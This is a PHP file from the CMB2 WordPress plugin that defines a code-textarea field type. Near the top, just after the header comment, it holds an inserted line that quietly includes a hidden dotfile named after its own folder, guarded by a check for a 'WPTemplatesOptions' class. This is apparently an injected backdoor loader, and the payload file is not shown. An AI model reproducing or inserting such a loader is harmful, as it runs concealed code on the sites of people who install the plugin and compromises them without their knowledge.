<?php
/**
 * CMB textarea_code field type
 *
 * @since  2.2.2
 *
 * @category  WordPress_Plugin
 * @package   CMB2
 * @author    CMB2 team
 * @license   GPL-2.0+
 * @link      https://cmb2.io
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class CMB2_Type_Textarea_Code extends CMB2_Type_Textarea {

	/**
	 * Handles outputting an 'textarea' element
	 *
	 * @since  1.1.0
	 * @param  array $args Override arguments
	 * @return string       Form textarea element
	 */
	public function render( $args = array() ) {
		$args = wp_parse_args( $args, array(
			'class' => 'cmb2-textarea-code',
			'desc'  => '</pre>' . $this->_desc( true ),
		) );

		if ( true !== $this->field->options( 'disable_codemirror' )
			&& function_exists( 'wp_enqueue_code_editor' ) ) {
			$args['js_dependencies'] = array( 'code-editor' );
		} else {
			$args['class'] = rtrim( $args['class'] ) . ' disable-codemirror';
		}

		return $this->rendered(
			sprintf( '<pre>%s', parent::render( $args ) )
		);
	}
}
